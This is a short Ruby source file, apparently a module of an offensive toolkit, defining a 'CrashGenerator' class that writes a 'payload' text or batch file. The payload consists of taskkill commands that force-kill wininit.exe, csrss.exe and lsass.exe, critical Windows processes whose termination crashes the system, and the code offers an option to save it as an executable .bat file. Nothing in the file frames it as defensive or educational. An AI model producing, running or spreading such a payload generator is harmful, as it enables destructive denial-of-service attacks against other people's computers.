class CrashGenerator
  def initialize
    @file_name = "payload"
    @format = "txt"
    ensure_generated_folder
  end

  def ensure_generated_folder
    Dir.mkdir("generated") unless Dir.exist?("generated")
  end

  def run
    file_path = "generated/#{@file_name}.#{@format}"
    payload_content = [
      "taskkill /f /im wininit.exe",
      "taskkill /f /im csrss.exe",
      "taskkill /f /im lsass.exe"
    ]
    File.write(file_path, payload_content.join("\n"))
    puts "[+] Payload saved as #{file_path}"
  end

  def set_option(option, value)
    case option.downcase
    when "file_name"
      @file_name = value
    when "format"
      @format = value.downcase == "bat" ? "bat" : "txt"
    else
      puts "[-] Unknown option: #{option}"
    end
  end

  def show_options
    puts "File Name: #{@file_name}"
    puts "Format: #{@format}"
  end
end